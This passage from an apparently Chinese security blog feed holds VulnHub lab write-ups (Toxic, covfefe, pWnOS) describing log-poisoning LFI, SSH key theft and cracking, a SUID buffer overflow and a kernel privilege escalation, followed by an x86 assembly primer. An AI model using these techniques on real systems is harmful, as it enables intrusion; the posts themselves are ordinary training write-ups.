<p><img src="/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.jpg"></p>
<p><img src="/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.jpg"></p>
<p>而且这里显示的还有Nginx用户，那么就可以试着读取常用的一些目录</p>
<blockquote>
<p><a href="https://developer.aliyun.com/article/704954">https://developer.aliyun.com/article/704954</a></p>
</blockquote>
<p><img src="/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.jpg"></p>
<p>Nginx服务器在网站上的每一步操作都将会被写入日志文件log内，所以可以去看一下</p>
<p><img src="/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.jpg"></p>
<p><img src="/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.jpg"></p>
<p>通过index.php文件能够读取敏感文件，可以确定这是存在本地文件包含漏洞</p>
<p>那就尝试通过index写入一句话</p>
<p>因为每个访问都记录下了user-agent头，所以把语句写到user-agent里去。</p>
<p><img src="/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.jpg"></p>
<p>也能被执行</p>
<p>接着就通过system()函数读取本地目录（太懒不想去连马了）</p>
<p><img src="/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.jpg"></p>
<p>看到了一个有flag字样的文件</p>
<p><img src="/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.jpg"></p>
<p>去读取这个文件</p>
<p> <img src="/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.jpg"></p>
<p>漏洞利用成功，拿到了flag</p>
<p><img src="/2022/04/12/%E9%9D%B6%E6%9C%BAToxic%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.jpg"></p>
<p>结束。</p>
<p>简单吧~</p>
]]></content>
      <categories>
        <category>靶机渗透记录</category>
      </categories>
      <tags>
        <tag>靶机渗透记录</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机covfefe: 1渗透记录</title>
    <url>/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="好久不写笔记了，随便整个靶机划划水"><a href="#好久不写笔记了，随便整个靶机划划水" class="headerlink" title="好久不写笔记了，随便整个靶机划划水"></a>好久不写笔记了，随便整个靶机划划水</h2><blockquote>
<p>下载地址：<a href="https://www.vulnhub.com/entry/covfefe-1,199/">https://www.vulnhub.com/entry/covfefe-1,199/</a></p>
</blockquote>
<hr>
<p>ps：covfefe是川建国自创的新词（） 看起来也是很有趣的靶机（）</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机SSH-私钥泄露×1 NAT模式<br>攻击机 win10  kali 2021.2×1<br>搜索引擎，你学习的热情</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>打开虚拟机<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>首先先确定目标ip，这个时候可以扫描内网，如果不知道哪个是我们的目标可以看一下mac地址。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>确定好ip之后，进行更深一步的探测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.155.146</span><br></pre></td></tr></table></figure>
<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>可以看到有一个22端口（ssh服务），还有两个http服务。<br>先去网页看一下吧。</p>
<span id="more"></span>
<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>给了两个网页都没东西，用字典工具跑一下看看有没有别的发现<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>先去/robots.txt看看<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>前两个都属于配置文件，不用太关注，直接访问/taxes目录<br>获得了第一个flag    flag1{make_america_great_again}<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>好家伙，看来国外的CTF也喜欢玩梗哈哈哈<br>在访问一下/.ssh<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br>尝试下载私钥，发现可以下载，那就说明这里有一处漏洞了。<br>拿到私钥我们就无需密码即可进行ssh链接。<br>首先需要修改权限，必须是600！必须是600！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>修改权限后，进行链接。<br>账户在关键字中有泄露<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa simon@192.168.155.146   </span><br></pre></td></tr></table></figure>
<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>还是需要密码，需要用john进行破解<br>先用ssh2john.py转换成john可识别的信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /usr/share/john/ssh2john.py id_rsa &gt; 1</span><br></pre></td></tr></table></figure>
<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>破解。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>破解出来了，接着ssh链接。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>链接成功。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>跳转到/root目录发现有flag文件，但是没有权限打不开。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>不是root权限，需要提权<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"><br>查找root权限可执行文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br><code>/root</code>目录下有个<code>read_message</code>，这不巧了吗，能以root权限运行的程序里就有<code>read_message</code>，就从这里入手。<br>运行一下这个文件看看是什么。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>简单的pwn 通过栈溢出来获取flag。<br>程序的意思大概是如果你是Simon，就会调用execve函数，而这个函数调用程序使用的是root权限。然而buf[]只能储存20个字符，gets（buf）没有限制长度，超过20个字符的字符就会存到缓冲区，覆盖后面的内容。输入超过缓存长度的字符 超出的那部分为拥有root权限的路径。<br>Simon后面随便来十五个字符。</p>
<p>本人菜，哪里解释错了欢迎师傅们指出来。</p>
<p>运行文件，在Simon后面随便来十五个字符再加上/bin/sh即可提权成功。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br>提权成功，拿到最后一个flag。<br>至此，渗透结束。</p>
<hr>
<p>本人萌新一枚，不足之处希望师傅们可以指出来让我好好学习一下。<br>最后，感谢你看到这里~o(<em>￣︶￣</em>)o</p>
]]></content>
      <categories>
        <category>靶机渗透记录</category>
      </categories>
      <tags>
        <tag>靶机渗透记录</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机pWnOS:1.0渗透记录</title>
    <url>/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<blockquote>
<p>下载地址：<a href="http://www.vulnhub.com/entry/pwnos-10,33/">http://www.vulnhub.com/entry/pwnos-10,33/</a></p>
</blockquote>
<hr>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机pWnOS:1.0×1<br>渗透机2021.2×1   和靶机在同一网段<br>搜索引擎o(<em>￣︶￣</em>)o</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描内网，确定渗透ip。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>确定ip之后开始信息探测。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.140</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"></p>
<span id="more"></span>
<p>有两个网页，去看一眼。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>一个是博客，一个是后台管理的登录界面。得到提示是webmin。<br>前面的博客主页有漏洞。（LFI本地文件包含漏洞）</p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit webmin</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>找到了可以利用的漏洞，那就直接用吧。<br>该漏洞未对特定信息进行处理。可以利用这个漏洞通过精心构造的URL读取服务器上任何文件的内容，并且不需要登录。</p>
<hr>
<blockquote>
<p>参考：<a href="https://www.exploit-db.com/exploits/5092">https://www.exploit-db.com/exploits/5092</a></p>
</blockquote>
<hr>
<p>启动msf<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>漏洞利用<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>shadow文件的hash是加密过的，尝试用john破解。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>记得先把rockyou.txt.gz解压。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>输入命令，等一小会。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br>解密成功。<br>【PS：做到这里想到刚才博客那里其实就可以构造url去读取shadow文件，也不用在拐到webmin上了。手工构造poc就行/..%01一点一点加起来~】<br>h4ckm3           (vmware)<br>接下来shh链接。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>进行了简单的信息收集，发现这个靶机的内核有点老。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"><br>所以想尝试一下从这里入手。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search vmsplice</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>把利用文件移到桌面上。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>这边渗透机开启服务，用于传输文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 2333   #不指定的话默认为8000端口</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>这边靶机下载文件。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>传输好之后编译、运行。（C源码文件一定要放到目标机上编译才能运行）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc 5092.c</span><br></pre></td></tr></table></figure>
<p><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>运行，提权完成。<br><img src="/2021/08/03/%E9%9D%B6%E6%9C%BApWnOS-1-0%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"><br>顺带提一嘴，这靶机系统挺老的了，估计可以提权多的去了（）<br>欢迎大家尝试不同的姿势~</p>
<hr>
<blockquote>
<p>在海天相接的地方，飞鸟也可以亲吻鱼。</p>
</blockquote>
<hr>
]]></content>
      <tags>
        <tag>靶机渗透记录</tag>
      </tags>
  </entry>
  <entry>
    <title>我的pwn学习之路——第一天</title>
    <url>/2022/03/13/pwn%E5%AD%A6%E4%B9%A0%E5%B0%8F%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>每天进步多一点，妈妈夸我小天才~（雾）</p>
<p>感谢在我前进道路上为我指点迷津的各位师傅（鞠躬）</p>
<p>对我来讲，学汇编学pwn真的不是个容易活……只能加油，加油，加加油了！！</p>
<h1 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h1><p>有亿点累的一天orz（其实用了三天来学这些东西）</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong>CPU对存储器的读写</strong></p>
<p>CPU要想进行数据的读写，必须和外部器件（即芯片）进行三类信息的交互： </p>
<p>1.地址信息：存储单元的地址 2.控制信息：芯片的选择，读或写命令 3.数据信息：读或写的数据</p>
<p>CPU=运算器+控制器+【寄存器】，器件之间通过总线相连</p>
<p>一个16位寄存器所能存储的数据的最大值为多少？ </p>
<p>因为每一位存放的数据是0或1，那么最大的数值自然就是 1111 1111 1111 1111（2），也就是2^16-1</p>
<span id="more"></span>

<p><strong>汇编指令是不区分大小写的</strong><br>mov AX,BX 的意思是将BX中的数据放在AX中<br>add AX,BX 的意思是将BX与AX相加，放在AX中</p>
<p><strong>如果超过数据的存储范围，就会有数据的丢失</strong><br>这里的丢失，指的就是进位制不能在8位寄存器中保存，但是CPU不是真的丢弃这个进位值。</p>
<p><strong>CPU访问内存单元时要给出内存单元的地址，所有的内存单元构成的存储空间是一个一维的线性空间。</strong></p>
<p>我们将这个唯一的地址称为物理地址。</p>
<p><strong>关于段空间</strong></p>
<p>内存没有分段，段的划分来自于CPU，</p>
<p>由于8086CPU用“（段地址×16）+偏移地址=物理地址”的方式给出内存单元的物理地址，</p>
<p>使得我们可以用分段的方式来管理内存。</p>
<h2 id="何为寄存器？"><a href="#何为寄存器？" class="headerlink" title="何为寄存器？"></a>何为寄存器？</h2><p>看了点资料，还是有点迷，于是打开知乎发现一条匿名用户的解答</p>
<blockquote>
<p>寄存器就是你的口袋。身上只有那么几个，只装最常用或者马上要用的东西。</p>
<p>内存就是你的背包。有时候拿点什么放到口袋里，有时候从口袋里拿出点东西放在背包里。</p>
<p>辅存就是你家里的抽屉。可以放很多东西，但存取不方便。 </p>
</blockquote>
<p>还有一个回答我也很喜欢</p>
<blockquote>
<p>如果把被储存的东西比作能量：</p>
<ol>
<li><p>寄存器就是 ATP，可以随时拿来用，性能高，但数量有限；</p>
</li>
<li><p>内存就是葡萄糖，性能一般，但是存量可以比较多；</p>
</li>
<li><p>外存（比如硬盘）就是脂肪，容量可以非常大，性能很差，要先转化为葡萄糖（存进内存），然后转化为 ATP（放到寄存器）才能直接利用（存取）。</p>
</li>
</ol>
</blockquote>
<p>了解完什么是寄存器之后再来见一见常见的寄存器有哪些</p>
<h2 id="几个常用的寄存器"><a href="#几个常用的寄存器" class="headerlink" title="几个常用的寄存器"></a>几个常用的寄存器</h2><p>首先，e开头的为x32，r开头的为x64。</p>
<p>寄存器有多种用途，但每一个都有“专长”，有各自的特别之处</p>
<h3 id="数据寄存器：AX、BX、CX、DX"><a href="#数据寄存器：AX、BX、CX、DX" class="headerlink" title="数据寄存器：AX、BX、CX、DX"></a>数据寄存器：AX、BX、CX、DX</h3><p>一般寄存器:AX、BX、CX、DX<br>AX:累积暂存器，BX:基底暂存器，CX:计数暂存器，DX:资料暂存器</p>
<p>一个寄存器可以存放16bit,也就是2bytes. 所以也被称为16位寄存器</p>
<blockquote>
<p>1GB=1024MB=1024*1024KB</p>
<p>1KB=1024Byte（字节）  1Byte=8bit（比特）</p>
</blockquote>
<p>那它们有什么特殊的地方使得它们和其他寄存器不一样呢？ 那是因为这四个16位寄存器可以被分为两个8位寄存器，比如</p>
<p>​    AX = AH + AL， BX = BH+BL, CX = CH + CL,  DX = DH+DL</p>
<blockquote>
<p>AH是AX的高字节（高8位），AL是AX的低字节（低8位）</p>
<p>其余三个同理</p>
</blockquote>
<p>一个16位寄存器所能存储的数据的最大值为多少？ </p>
<p>因为每一位存放的数据是0或1，那么最大的数值就是 1111 1111 1111 1111（2），也就是2^16-1</p>
<h3 id="变址寄存器：SI、DI"><a href="#变址寄存器：SI、DI" class="headerlink" title="变址寄存器：SI、DI"></a>变址寄存器：SI、DI</h3><p>SI:源变址寄存器，DI:目的变址寄存器</p>
<p>SI DI不能够分成两个8位寄存器来使用，二者都是在某个地址的基础上进行偏移变化所以叫基址暂存器。</p>
<p>这两个寄存器有自动增量和自动减量的功能所以用于变址是很方便的。</p>
<h3 id="指针寄存器：SP、BP"><a href="#指针寄存器：SP、BP" class="headerlink" title="指针寄存器：SP、BP"></a>指针寄存器：SP、BP</h3><p>SP:堆栈指针暂存器，BP:基底指针暂存器</p>
<p>先说BP，基底指针暂存器其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</p>
<blockquote>
<p>bp/ebp/rbp 栈基址寄存器—指向栈底</p>
</blockquote>
<p>在8086CPU中，只有bx，si，di，bp这4个寄存器可以用来进行内存单元的寻址</p>
<p>这4个寄存器可以单个出现或只能以四种组合出现;bx和si，bx和di，bp和si，bp和di</p>
<blockquote>
<p>bx和bp不能同时出现，si和di不能同时出现</p>
</blockquote>
<p>接着是SP，堆叠指标暂存器，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。SP的作用就是指示当前要出栈或入栈的数据，并在操作执行后自动递增或递减。</p>
<blockquote>
<p>sp/esp/rsp（16bit/32bit/64bit）栈寄存器—指向栈顶</p>
</blockquote>
<h3 id="段寄存器（特殊寄存器）"><a href="#段寄存器（特殊寄存器）" class="headerlink" title="段寄存器（特殊寄存器）"></a>段寄存器（特殊寄存器）</h3><p>段寄存器就是提供段地址的</p>
<blockquote>
<p>CS——代码段寄存器(Code Segment Register)，其值为代码段的段值<br>DS——数据段寄存器(Data Segment Register)，其值为数据段的段值<br>ES——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值<br>SS——堆栈段寄存器(Stack Segment Register)，其值为堆栈段的段值<br>FS——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值<br>GS——附加段寄存器(Extra Segment Register)，其值为附加数据段的段值</p>
</blockquote>
<h3 id="指令指针寄存器：IP"><a href="#指令指针寄存器：IP" class="headerlink" title="指令指针寄存器：IP"></a>指令指针寄存器：IP</h3><p>CS和IP，两个最关键的寄存器，他们指示了cpu当前要读取指令的地方</p>
<p>修改CS、IP的指令不同于修改通用的寄存器值的指令，修改通用寄存器的值可以用mov 指令（mav ax,123），mov指令被称为传送指令。而修改CS、IP的指令是jmp指令。jmp指令也被称为转移指令（在X86上不能直接给IP赋值）</p>
<blockquote>
<p>ip/eip/rip 程序指令寄存器—指向下一条待执行指令</p>
</blockquote>
<h3 id="标志寄存器（特殊寄存器）"><a href="#标志寄存器（特殊寄存器）" class="headerlink" title="标志寄存器（特殊寄存器）"></a>标志寄存器（特殊寄存器）</h3><p>进位标志位(Carry Flag &amp;&amp; CF)：当无符号数的计算结果超出其范围时，CF被置为1， 否则CF被置为0。<br>溢出标志位(Overflow Flag &amp;&amp; OV)：当有符号数的计算结果超出其范围时，OV被置为1，否则OV被置为0。<br>符号标志位(Sign Flag &amp;&amp; SF)：算术或逻辑操作产生负结果时，SF被置为1，否则SF被置为0。<br>零标志位(Zero Flag &amp;&amp; ZF)：算数或逻辑结果产生的结果为零时，ZF被置为1，否则ZF被置为0。<br>辅助进位标志位(Auxiliary Carry Flag &amp;&amp; AC)：运算时若最低的四位产生了进位，那么AC被置为1，否则AC被置为0。<br>奇偶校验标志位(Parity Flag)：目标操作数最低有效字节中的1的个数为偶数时，PF被置为1，否则PF被置为0。</p>
<h2 id="常用的汇编指令"><a href="#常用的汇编指令" class="headerlink" title="常用的汇编指令"></a>常用的汇编指令</h2><p>汇编语言发展至今，有以下3类指令组成：</p>
<p>1.汇编指令       机器码的助记符，有对应的机器码</p>
<p>2.伪指令           没有对应的机器码，由编译器执行，计算机不执行</p>
<p>3.其他符号       如+,-,*,/等，由编译器识别，没有对应的机器码</p>
<blockquote>
<p>不区分大小写，比如<code>mov</code>和<code>MOV</code>是一样的</p>
</blockquote>
<h3 id="简单算术指令"><a href="#简单算术指令" class="headerlink" title="简单算术指令"></a>简单算术指令</h3><p>算数运算类指令包括加减乘除、比较与调整指令</p>
<p>ADD： 加法                               SUB： 减法</p>
<p>ADC： 带进位加法                    SBB： 带借位减法</p>
<p>MUL： 乘法                               DIV： 除法</p>
<p>MUL和DIV结果回送AH和AL（字节运算），或DX和AX（字运算）</p>
<p>INC： 加 1                                 DEC： 减 1</p>
<p>AAA： 加法的ASCII码调整        AAS： 减法的ASCII码调整</p>
<p>AAM： 乘法的ASCII码调整       AAD： 除法的ASCII码]调整</p>
<p>NEG：去补 （对操作数取补（相反数））</p>
<p>CMP： 比较（两个操作数作减法，仅修改标志位，不回送结果）</p>
<h3 id="输入输出端口传送指令"><a href="#输入输出端口传送指令" class="headerlink" title="输入输出端口传送指令"></a>输入输出端口传送指令</h3><p>IN I/O端口输入   (IN 累加器, {端口号│DX} )<br>OUT I/O端口输出  ( OUT {端口号│DX},累加器 )</p>
<p>输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时,其范围是 0-65535</p>
<h3 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h3><p>逻辑运算类指令分为逻辑运算指令和移位指令两大类</p>
<p>运算指令：</p>
<p>AND： 与运算                              OR： 或运算</p>
<p>XOR： 异或运算                           NOT： 取反。</p>
<p>TEST： 测试   （两操作数作与运算，仅修改标志位，不回送结果）</p>
<p>移位指令：</p>
<p>SHL： 逻辑左移。                         SAL： 算术左移。(=SHL)</p>
<p>RCL： 通过进位的循环左移          RCR： 通过进位的循环右移</p>
<h3 id="程序转移指令"><a href="#程序转移指令" class="headerlink" title="程序转移指令"></a>程序转移指令</h3><p>控制转移类指令包括无条件转移指令、条件转移指令、循环控制指令、中断指令、子程序调用和返回指令</p>
<p>无条件转移指令：</p>
<p>JMP： 无条件转移指令</p>
<p>CALL： 过程调用                          RET/RETF： 过程返回</p>
<p>中断指令：</p>
<p>INT： 中断指令              INTO： 溢出中断          IRET： 中断返回</p>
<h3 id="内存访问指令-amp-内存读取指令"><a href="#内存访问指令-amp-内存读取指令" class="headerlink" title="内存访问指令&amp;内存读取指令"></a>内存访问指令&amp;内存读取指令</h3><p>（当ldr后面没有=号时为内存读取指令）</p>
<h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><p>PUSH：把字压入堆栈     进栈指令   把16位数据src压入堆栈                  </p>
<p>POP：把字弹出堆栈       出栈指令   从堆栈弹出16位数据至dst</p>
<p>MOV：传送字或传送字节</p>
<p>MOVSX：先符号扩展,再传送           MOVZX：先零扩展,再传送  </p>
<h3 id="目的地址传送指令"><a href="#目的地址传送指令" class="headerlink" title="目的地址传送指令"></a>目的地址传送指令</h3><p>LEA：装入有效地址                        </p>
<p>LDS：传送目标指针,把指针内容装入DS           LES：传送目标指针,把指针内容装入ES</p>
<p>LFS：传送目标指针,把指针内容装入FS            LGS：传送目标指针,把指针内容装入GS</p>
<p>LSS：传送目标指针,把指针内容装入SS</p>
<h3 id="标志传送指令"><a href="#标志传送指令" class="headerlink" title="标志传送指令"></a>标志传送指令</h3><p>LAHF：标志寄存器传送,把标志装入AH<br>SAHF：标志寄存器传送,把AH内容装入标志寄存器<br>PUSHF：标志入栈                    POPF：标志出栈</p>
<h3 id="程序转移指令-1"><a href="#程序转移指令-1" class="headerlink" title="程序转移指令"></a>程序转移指令</h3><p>JMP：无条件转移指令<br>CALL：过程调用              RET/RETF：过程返回</p>
<h3 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h3><p>DW 定义字(2字节)       PROC 定义过程       SEGMENT 定义段<br>ASSUME 建立段寄存器寻址<br>ENDS 段结束              END 程序结束          ENDP 过程结束</p>
<h2 id="GCC编译保护机制以及编译命令"><a href="#GCC编译保护机制以及编译命令" class="headerlink" title="GCC编译保护机制以及编译命令"></a>GCC编译保护机制以及编译命令</h2><p>科普向但是大多自己看不懂@_@</p>
<p>Linux操作系统中gcc相关的安全保护机制有：1.栈Canaries保护、2.PIE机制、3.NX、4.fortity、relro机制。</p>
<p>checksec 文件     （gdb里peda插件里自带的checksec功能）</p>
<p><img src="/2022/03/13/pwn%E5%AD%A6%E4%B9%A0%E5%B0%8F%E6%80%BB%E7%BB%93/checksec.png"></p>
<p>然后就是对这些机制进行简单了解</p>
<p>Arch，xx位的程序，图中为x64</p>
<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>Relocation Read-Only (RELRO) 让加载器将重定位表中加载时解析的符号标记为只读，这减少了GOT覆写攻击的面积。此项技术主要针对 GOT 改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。<br>部分RELRO 易受到攻击，例如攻击者可以atoi.got为system.plt，进而输入/bin/sh\x00获得shell<br>完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c // 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o test test.c // 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o test test.c // 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o test test.c // 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure>

